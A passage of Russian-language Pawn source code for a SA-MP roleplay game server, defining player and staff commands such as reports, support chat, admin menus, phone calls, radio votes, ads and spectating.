		format(YCMDstr, sizeof(YCMDstr), "<-%s[%i] to %s[%i]: %s",Name(playerid),playerid, Name(params[0]),params[0],params[1]);
		HelperMessage(0xffa500ff,YCMDstr);
		PlayerInfo[playerid][pRatingSupport] += 1;
		printf("Саппорт %s ответил игроку %s: %s", Name(playerid), Name(params[0]), params[1]);
	}
	return true;
}
CMD:report(playerid, params[])
{
	new text[128];
	if(sscanf(params, "us[128]",params[0], text)) return SCM(playerid, -1, " Введите: /report [playerid] [текст]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок, чей ID вы указали, оффлайн");
	format(YCMDstr, sizeof(YCMDstr), " Жалоба от %s[%i] на %s[%i]: %s", Name(playerid), playerid, Name(params[0]), params[0], text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	SCM(playerid, COLOR_LIGHTRED, " Ваша жалоба была отправлена администрации");
	SendAdminMessage(0xD97700AA, YCMDstr);
	return true;
}
CMD:aquestion(playerid, params[])
{
	new text[128];
	if(sscanf(params, "s[128]", text)) return SCM(playerid, -1, " Введите: /aquestion [текст]");
	format(YCMDstr, sizeof(YCMDstr), " Репорт от %s[%i]: %s", Name(playerid), playerid, text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	SCM(playerid, COLOR_LIGHTRED, " Ваша жалоба была отправлена администрации");
	SendAdminMessage(0xD97700AA, YCMDstr);
	printf("Игрок %s написал в репорт: %s", Name(playerid), text);
	return true;
}
CMD:question(playerid, params[])
{
	new text[128];
	if(sscanf(params, "s[128]", text)) return SCM(playerid, -1, " Введите: /question [текст]");
	format(YCMDstr, sizeof(YCMDstr), "->Вопрос %s[%i]: %s", Name(playerid), playerid, text);
	SCM(playerid, COLOR_YELLOW, YCMDstr);
	HelperMessage(0xffa500ff, YCMDstr);
	printf("Игрок %s написал вопрос саппортам: %s", Name(playerid), text);
	return true;
}
CMD:sc(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(SDuty[playerid] == 0 && (PlayerInfo[playerid][pHelper] == 0 || PlayerInfo[playerid][pHelper] == 2)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта команда");
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /sc [текст]");
	format(YCMDstr, sizeof(YCMDstr), " <SUPPORT-CHAT> %s: %s",Name(playerid),params[0]);
	//HelperMessage(0x81DA99AA,YCMDstr);
	HelperMessage(0xffa500ff, YCMDstr);
	printf(YCMDstr);
	return true;
}
CMD:sduty(playerid, params[])
{
	if(PlayerInfo[playerid][pHelper] == 0 && PlayerInfo[playerid][pAdmin] < 2) return SCM(playerid,COLOR_GREY," Вы не саппорт");
	if(SDuty[playerid] == 0)
	{
	    if(PlayerInfo[playerid][pHelper] == 1 || PlayerInfo[playerid][pAdmin] > 1)
	    {
			SDuty[playerid] = 1;
			SCM(playerid, -1, " Рабочий день начат");
			printf("Саппорт %s начал рабочий день", Name(playerid));
	    }
	    else if(PlayerInfo[playerid][pHelper] == 2)
	    {
			SCM(playerid, COLOR_GREY, " Ваши права саппорта временно заморожены");
			printf("Саппорт %s попытался войти в панель саппорта с заморожеными правами", Name(playerid));
	    }
	}
	else if(SDuty[playerid] == 1)
	{
	    SDuty[playerid] = 0;
	    SCM(playerid, -1, " Рабочий день закончен");
	    printf("Саппорт %s закончил рабочий день", Name(playerid));
	}
	return 1;
}
CMD:splist(playerid,params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	new strin[2048], query[1048];
	query = ""; strin = "";
	if(PlayerInfo[playerid][pAdmin] < 4) return true;
	new Names[MAX_PLAYER_NAME],DataReg[50],LastLogin[50],LastIP[16],RatingSupport;
	strcat(query,"Имя | Рейтинг | Дата Регистрации | Дата посл.входа | Последний IP \n\n");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE pHelper = '1'");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)
	{
		for(new i = 0; i < r; i++)
		{
			cache_get_field_content(i,"Name",Names,DATABASE,60);
			cache_get_field_content(i,"pDataReg",DataReg,DATABASE,32);
			cache_get_field_content(i,"pvIp",LastIP,DATABASE,32);
			cache_get_field_content(i,"pOnline",LastLogin,DATABASE,32);
			RatingSupport = cache_get_field_content_int(i,"pRatingSupport");
			format(strin,sizeof(strin),"{FFFFFF}%s | %i | %s | %s | %s\n",Names,RatingSupport,DataReg,LastLogin,LastIP);
			strcat(query, strin);
		}
	} else format(query, sizeof(query), "\n\n{FF0000}Саппортов нет        !\n\n");
	ShowPlayerDialogEx(playerid,0,0,"Список саппортов",query,"Закрыть","");
	return true;
}
CMD:spmenu(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5) return true;
	new Names[32], query[128];
	if(PlayerInfo[playerid][pAdmin] > 7) format(query, sizeof(query), "{00FF00}Назначить саппорта\n");
    mysql_format(DATABASE, QUERY, 62, "SELECT Name FROM `"TABLE_ACCOUNTS"` WHERE pHelper IN ('1','2')");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)
	{
		for(new i = 0; i < r; i++)
		{
			new strin[40];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
            format(strin,sizeof(strin),"%s\n",Names);
			strcat(query, strin);
		}
	}
	ShowPlayerDialogEx(playerid, 21021, DIALOG_STYLE_LIST, "Управление саппортами", query, "Выбор", "Отмена");
	return true;
}
CMD:admmenu(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	new Names[32], query[2048], levels;
	format(query, sizeof(query), "Nik\tLvl\n");
	if(PlayerInfo[playerid][pAdmin] >= 9) strcat(query, "{00FF00}Назначить администратора\n");
    mysql_format(DATABASE, QUERY, 62, "SELECT `Name`,`level` FROM `"TABLE_ADMIN"`");
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
		for(new i = 0; i < r; i++)
		{
			new strin[40];
			cache_get_field_content(i,"Name",Names,DATABASE,60);
			levels = cache_get_field_content_int(i,"level");
            format(strin,sizeof(strin),"%s\t%i\n",Names, levels);
			if(levels) strcat(query, strin);
		}
	}
	ShowPlayerDialogEx(playerid, 21025, DIALOG_STYLE_TABLIST_HEADERS, "Управление администраторами", query, "Выбор", "Отмена");
	return true;
}
CMD:call(playerid, params[])
{
	if(sscanf(params, "d",params[0]))
	{
		ShowPlayerDialogEx(playerid, 9956, DIALOG_STYLE_LIST, "Выберите сервис", "[1] Полиция \n[2] Скорая помощь \n[3] Таксопарк\n[4] Автомастерская", "Выбрать", "Назад");
		return true;
	}
	if(Mobile[playerid] != 999) return SCM(playerid, COLOR_GRAD2, " Вы уже разговариваете по телефону ");
	format(YCMDstr, sizeof(YCMDstr), " %s достает телефон",Name(playerid));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
	CallInfo[playerid][callused] = 1;
	if(params[0] == PlayerInfo[playerid][pPnumber])
	{
		SCM(playerid, COLOR_GRAD2, " Линия занята");
		SetPlayerSpecialAction(playerid,13);
		return true;
	}
	if(params[0] == 11888)
	{
		if(smsls == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[0] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smsls, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smsls));
		ProxDetector(30.0, smsls, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		zvonok[0] = playerid;
		PlayerInfo[playerid][pMobile] += smspricels;
		FracBank[0][fLsnews] += smspricels;
		return true;
	}
	if(params[0] == 11555)
	{
		if(smssf == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[1] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smssf, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smssf));
		ProxDetector(30.0, smssf, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		PlayerInfo[playerid][pMobile] += smspricels;
		FracBank[0][fSfnews] += smspricels;
		zvonok[1] = playerid;
		return true;
	}
	if(params[0] == 11333)
	{
		if(smslv == -1) return SCM(playerid, COLOR_GREY, " Приём звонков отключён.");
		if(smsls == playerid || smssf == playerid || smslv == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете позвонить в эфир!");
		if(zvonok[2] != -1) return SCM(playerid, COLOR_GREY, " Линия занята!");
		format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s[%i]",Name(playerid), playerid);
		SCM(smslv, -1, YCMDstr);
		format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(smslv));
		ProxDetector(30.0, smslv, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerSpecialAction(playerid,11);
		PlayerInfo[playerid][pMobile] += smspricels;
		FracBank[0][fLvnews] += smspricels;
		zvonok[2] = playerid;
		return true;
	}
	foreach(i)
	{
		if(PlayerInfo[i][pPnumber] == params[0] && params[0] != 0)
		{
			Mobile[playerid] = i;
			if(!IsPlayerConnected(i)) return true;
			if(PhoneOnline[Mobile[playerid]] > 0) return SCM(playerid, COLOR_GREY, " Телефон абонента выключен...");
			if(Mobile[Mobile[playerid]] == 999)
			{
				format(YCMDstr, sizeof(YCMDstr), " Ваш мобильник звонит. Введите (/P)ickup. Звонит: %s",Name(playerid));
				SCM(Mobile[playerid], -1, YCMDstr);
				PlayerPlaySound(Mobile[playerid], 20600, 0.0, 0.0, 0.0);
				format(YCMDstr, sizeof(YCMDstr), " У %s звонит мобильник",Name(i));
				ProxDetector(30.0, i, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				SetPlayerSpecialAction(playerid,11);
				CellTime[playerid] = 1;
				return true;
			}
		}
	}
	if(Mobile[playerid] == -1)
	{
		SCM(playerid, COLOR_GRAD2, " Телефон вне зоны доступа сети");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		return true;
	}
	return true;
}
CMD:pickup(playerid, params[])
{
	if(Mobile[playerid] != 999) return SCM(playerid, COLOR_GRAD2, " Вы уже разговариваете по телефону");
	foreach(i)
	{
		if(IsPlayerConnected(i))
		{
			if(Mobile[i] == playerid)
			{
				Mobile[playerid] = i;
				SCM(i, COLOR_GRAD2, " Поднял(а) трубку телефона.");
				SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
				format(YCMDstr, sizeof(YCMDstr), " %s ответил на звонок", Name(playerid));
				ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				PlayerPlaySound(playerid, 1069, 0.0, 0.0, 0.0);
				GetPlayerPos(playerid,CallInfo[playerid][callx],CallInfo[playerid][cally],CallInfo[playerid][callz]);
				CallInfo[playerid][callused] = 1;
			}
		}
	}
    if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid)
    {
        if(zvonok[1] != -1)
		{
	        Tel[zvonok[1]] = 1;
			SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[1]));
			SCM(zvonok[1], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLive[zvonok[1]] = 1;
			PlayerInfo[zvonok[1]][pMobile] -= smspricesf;
			FracBank[0][fSfnews] += smspricesf;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
	}
    else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid)
    {
        if(zvonok[0] != -1)
        {
	    	Tel[zvonok[0]] = 1;
	    	SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[0]));
			SCM(zvonok[0], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLivels[zvonok[0]] = 1;
			PlayerInfo[zvonok[0]][pMobile] -= smspricels;
			FracBank[0][fLsnews] += smspricels;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
    }
    else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid)
    {
    	if(zvonok[2] != -1)
		{
			Tel[zvonok[2]] = 1;
	    	SendMes(playerid, COLOR_YELLOW, " %s попал в эфир", Name(zvonok[2]));
			SCM(zvonok[2], COLOR_YELLOW, " Вы попали в студию, говорите.");
			TalkingLivelv[zvonok[2]] = 1;
			PlayerInfo[zvonok[2]][pMobile] -= smspricelv;
			FracBank[0][fLvnews] += smspricelv;
		} else return SCM(playerid, COLOR_GREY, " Никто не звонит");
    }
    else return SCM(playerid, COLOR_GREY, " Вам никто не звонит");
	return true;
}
CMD:hangup(playerid, params[])
{
	if(IsPlayerConnected(Mobile[playerid]))
	{
		if(Mobile[playerid] != 999)
		{
			SCM(Mobile[playerid], COLOR_GRAD2, " Абонент положил(a) трубку");
			SetPlayerSpecialAction(Mobile[playerid],SPECIAL_ACTION_STOPUSECELLPHONE);
			CellTime[Mobile[playerid]] = 0;
			CellTime[playerid] = 0;
			Mobile[Mobile[playerid]] = 999;
			SCM(playerid, COLOR_GRAD2, " Вы повесили трубку");
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
			Mobile[playerid] = 999;
			Mobile[Mobile[playerid]] = 999;
			CellTime[playerid] = 0;
		}
	}
    if(PlayerInfo[playerid][pMember] == 9 && smssf == playerid && zvonok[1] != -1)
    {
        SCM(zvonok[1], COLOR_GREY, " Он повесил трубку!");
        SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[1],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[1]] = 255;
		TalkingLive[zvonok[1]] = 255;
		zvonok[1] = -1;
    }
    else if(PlayerInfo[playerid][pMember] == 16 && smsls == playerid && zvonok[0] != -1)
    {
		SCM(zvonok[0], COLOR_GREY, " Он повесил трубку!");
		SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetPlayerSpecialAction(zvonok[0],SPECIAL_ACTION_STOPUSECELLPHONE);
        Tel[zvonok[0]] = 255;
		TalkingLivels[zvonok[0]] = 255;
		zvonok[0] = -1;
    }
    else if(PlayerInfo[playerid][pMember] == 20 && smslv == playerid && zvonok[2] != -1)
    {
		SCM(zvonok[2], COLOR_GREY, " Он повесил трубку!");
		SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetPlayerSpecialAction(zvonok[2],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[2]] = 255;
		TalkingLivelv[zvonok[2]] = 255;
		zvonok[2] = -1;
    }
    else if(zvonok[1] == playerid)
    {
    	SCM(smssf, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[1],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[1]] = 255;
		TalkingLive[zvonok[1]] = 255;
		zvonok[1] = -1;
    }
	else if(zvonok[0] == playerid)
    {
    	SCM(smsls, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[0],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[0]] = 255;
		TalkingLivels[zvonok[0]] = 255;
		zvonok[0] = -1;
    }
    else if(zvonok[2] == playerid)
    {
    	SCM(smslv, COLOR_GREY, " Он повесил трубку!");
    	SCM(playerid, COLOR_GREY, " Вы повесили трубку!");
        SetPlayerSpecialAction(smssf,SPECIAL_ACTION_STOPUSECELLPHONE);
        SetPlayerSpecialAction(zvonok[2],SPECIAL_ACTION_STOPUSECELLPHONE);
		Tel[zvonok[2]] = 255;
		TalkingLivelv[zvonok[2]] = 255;
		zvonok[2] = -1;
    }
	return true;
}
CMD:vote(playerid)
{
	new voteid = -1;
	if(gNews[playerid] == 0)
	{
	    for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[sfn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[sfn][voteid][vlevel] > PlayerInfo[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[sfn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[sfn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[sfn][voteid][vcaption], VoteNews[sfn][voteid][vquestion],"Далее", "Отмена");
		
	}
	else if(lNews[playerid] == 0)
	{
		for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[lsn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[lsn][voteid][vlevel] > PlayerInfo[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[lsn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lsn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lsn][voteid][vcaption], VoteNews[lsn][voteid][vquestion],"Далее", "Отмена");
	}
	else if(LvNews[playerid] == 0)
	{
		for(new i = 0; i < 10; i++)
	    {
	        if(VoteNews[lvn][i][vactive] == 1)
	        {
				voteid = i;
				break;
	        }
	    }
	    if(VoteNews[lvn][voteid][vlevel] > PlayerInfo[playerid][pLevel]) return SCM(playerid, COLOR_GREY, " Это голосование не доступно для Вас.");
		if(strlen(VoteNews[lvn][voteid][vquestion]) == 0) return ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lvn][voteid][vcaption], VoteNews[sfn][voteid][vcaption],"Далее", "Отмена");
		ShowPlayerDialog(playerid, 3137, DIALOG_STYLE_MSGBOX, VoteNews[lvn][voteid][vcaption], VoteNews[lvn][voteid][vquestion],"Далее", "Отмена");
	}
	else return SCM(playerid, COLOR_GREY, " У вас не включено радио! {FFFFFF}(( /switchvawe ))");
	return true;
}
CMD:ad(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /ad [ текст ]");
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	//if(PlayerInfo[playerid][pLevel] < 3) return SCM(playerid, COLOR_GREY, "Подать обьявление можно с 3 левела");
	if(AdvertTime > gettime()) return SCM(playerid, COLOR_GREY, " Объявления можно дать через 15 секунд!");
	if(gNews[playerid] == 1 && lNews[playerid] == 1 && LvNews[playerid] == 1) return SCM(playerid, -1, "{B8B8B8} Вы не выбрали через какую радиостанцию подавать объявление. {FFFFFF}(( Используйте /radio ))");
	strmid (ReportQ[playerid],params[0], 0, strlen(params[0]), 128);
	if(lNews[playerid] == 0)
	{
	    if(PlayerInfo[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[0]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами LS NEWS",params[0],strlen(params[0])*addd[0]);
		ShowPlayerDialogEx(playerid,8454,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	else if(gNews[playerid] == 0)
	{
	    if(PlayerInfo[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[1]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами SF NEWS",params[0],strlen(params[0])*addd[1]);
		ShowPlayerDialogEx(playerid,8455,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	else if(LvNews[playerid] == 0)
	{
	    if(PlayerInfo[playerid][pCash] < strlen(params[0])*addd[0]) return SendMes(playerid, COLOR_GREY, " Нужно %i вирт", strlen(params[0])*addd[2]);
		format(YCMDstr,sizeof(YCMDstr),"{B8B8B8}Вы собираетесь отправить объявление:\n               {00FF5E}%s\n\n{B8B8B8}Стоимость:{00FF5E} %i вирт\n\n\n{56839C}Объявление будет подано после проверки!\nСпасибо что воспользовались услугами LV NEWS",params[0],strlen(params[0])*addd[2]);
		ShowPlayerDialogEx(playerid,8456,DIALOG_STYLE_MSGBOX,"{FFFFFF}Проверка",YCMDstr,"Отправить","Отмена");
	}
	return true;
}
CMD:time(playerid)
{
	if(!IsPlayerConnected(playerid)) return true;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && PlayerCuffedTime[playerid] == 0) ApplyAnimation(playerid, "COP_AMBIENT", "Coplook_watch",4.1,0,0,0,0,0);
	SetPlayerChatBubble (playerid, "Взглянул на часы", COLOR_PURPLE, 30.0, 10000);
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "January"; }
	else if(month == 2) { mtext = "February"; }
	else if(month == 3) { mtext = "March"; }
	else if(month == 4) { mtext = "April"; }
	else if(month == 5) { mtext = "May"; }
	else if(month == 6) { mtext = "June"; }
	else if(month == 7) { mtext = "July"; }
	else if(month == 8) { mtext = "August"; }
	else if(month == 9) { mtext = "September"; }
	else if(month == 10) { mtext = "October"; }
	else if(month == 11) { mtext = "November"; }
	else if(month == 12) { mtext = "December"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	FixHour(hour);
	hour = shifthour;
	if(PlayerInfo[playerid][pJailTime] > 0) format(YCMDstr, sizeof(YCMDstr), "~y~%02i %s~n~~g~~w~%02i:%02i~n~~w~Jail Time Left: %i sec~n~~g~Server 01", day, mtext, hour, minuite, PlayerInfo[playerid][pJailTime]);
	else format(YCMDstr, sizeof(YCMDstr), "~y~%02i %s~n~~g~~w~%02i:%02i~n~~g~Server"NumberServer, day, mtext, hour, minuite);
	GameTextForPlayer(playerid, YCMDstr, 5000, 1);
	return true;
}
CMD:house(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /house [номер дома]");
	SetPlayerPos(playerid,HouseInfo[params[0]][hEntrancex],HouseInfo[params[0]][hEntrancey],HouseInfo[params[0]][hEntrancez]);
	GameTextForPlayer(playerid, "~w~HOUSE", 5000, 1);
	return true;
}
CMD:chat(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(!BigEar[playerid]) BigEar[playerid] = 1, SCM(playerid, COLOR_GRAD2, " Слушать чат ON");
	else if(BigEar[playerid]) BigEar[playerid] = 0, SCM(playerid, COLOR_GRAD2, " Слушать чат OFF");
	return true;
}
CMD:recon(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return 1;
	if(!strcmp(params,"OFF",true) && Spectate[playerid]) return StopSpectate(playerid);
	if(!Spectate[playerid] && !strcmp(params,"OFF",true)) return SCM(playerid, COLOR_GREY, " Вы не в режиме наблюдения!");
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " С транспорта нельзя следить!");
	if(sscanf(params, "u",params[0]))
	{
		if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
		SpecAd[playerid] = 65535;
		if(!Spectate[playerid])
		{
			GetPlayerPos(playerid,SpecPlayer[playerid][0],SpecPlayer[playerid][1],SpecPlayer[playerid][2]);
			SpecPlayerInt[playerid] = GetPlayerInterior(playerid);
			SpecPlayerWorld[playerid] = GetPlayerVirtualWorld(playerid);
			GetPlayerFacingAngle(playerid, SpecPlayerAngle[playerid]);
		}
		ReconSelect[playerid] = 7;
		ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

		for(new i = 7; i < 35; i++)
		DisableEnableReconButton(playerid, i, 0, 0);

		for(new i = 0; i < 16; i++)
		PlayerTextDrawShow(playerid, ReconPlayer[i]);

		DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
		SelectTextDraw(playerid, 0xFFFFFFF);

		Spectate[playerid] = 1;
		ac_TogglePlayerSpectating(playerid, 1);
		printf("Администратор %s вышел из режима наблюдения", Name(playerid));
		return 1;
	}
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн / не залогинен");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]-1) return SCM(playerid, COLOR_GREY, " Наблюдение за администрацией запрещено!");
	if(Spectate[playerid]) return SCM(playerid, COLOR_GREY, " Вы уже наблюдете");
	if(SpecID[params[0]] != 65535) return SCM(playerid, COLOR_GREY, " Этот игрок уже под наблюдением");
	if(!Spectate[playerid])
	{
		GetPlayerPos(playerid,SpecPlayer[playerid][0],SpecPlayer[playerid][1],SpecPlayer[playerid][2]);
		SpecPlayerInt[playerid] = GetPlayerInterior(playerid);
		SpecPlayerWorld[playerid] = GetPlayerVirtualWorld(playerid);
		GetPlayerFacingAngle(playerid, SpecPlayerAngle[playerid]);
	}
	if(SpecAd[playerid] != INVALID_PLAYER_ID) SpecID[SpecAd[playerid]] = 65535;
	SpecAd[playerid] = 65535;
	SpecAd[playerid] = params[0];
	SpecID[params[0]] = playerid;
	//ShowMenuForPlayer(Admin,playerid);
	//PlayerTextDrawShow(playerid, NikPlayer);
	ReconSelect[playerid] = 7;
	ReconSelectSub[playerid] = INVALID_TEXT_DRAW;

	for(new i = 7; i < 35; i++)
	DisableEnableReconButton(playerid, i, 0, 0);

	for(new i = 0; i < 16; i++)
	PlayerTextDrawShow(playerid, ReconPlayer[i]);

	for(new x = 1; x < 11; x++)
	GetPlayerWeaponData(playerid,x,PlayerInfo[playerid][pWeapon][x-1],PlayerInfo[playerid][pAmmo][x-1]);

	DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
	SelectTextDraw(playerid, 0xFFFFFFF);
	Spectate[playerid] = 1;
	SetTimerEx("SpecPlayers", 100, false, "i", playerid);
	printf("Администратор %s начал следить за %s", Name(playerid), Name(params[0]));
	return 1;
}
CMD:alevel(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 7) return true;
	ShowPlayerDialog(playerid, 11486, DIALOG_STYLE_LIST, "Выбор чата", "{FFFF00}[0] Уровни [1-6]\n{00FF00}[1] Уровни [7-10]", "Выбрать", "Отмена");
	return true;
}
CMD:admin(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;//SCM(playerid,-1," Вы не авторизированы");
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/a)dmin [текст]");
	if(PlayerInfo[playerid][pAdmin] > 6)
	{
	    if(!GetPVarInt(playerid, "achat"))
	    {
			SCM(playerid, -1, " Для подальшей смены уровня админ-чата введите /alevel");
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, "/alevel");
	        SetPVarString(playerid, "achat", params[0]);
	        return true;
	    }
		else if(GetPVarInt(playerid, "achat") == 2)
	    {
		    format(YCMDstr, sizeof(YCMDstr), " <ADM-CHAT> %s: %s",PlayerInfo[playerid][pName],params[0]);
			ABroadCast(COLOR_GREEN,YCMDstr,7);
			printf(YCMDstr);
			return true;
	    }
	}
	format(YCMDstr, sizeof(YCMDstr), " <ADM-CHAT> %s: %s",PlayerInfo[playerid][pName],params[0]);
	ABroadCast(COLOR_YELLOW,YCMDstr,1);
	printf(YCMDstr);
	return true;
}
CMD:dropmoney(playerid, params[])
{
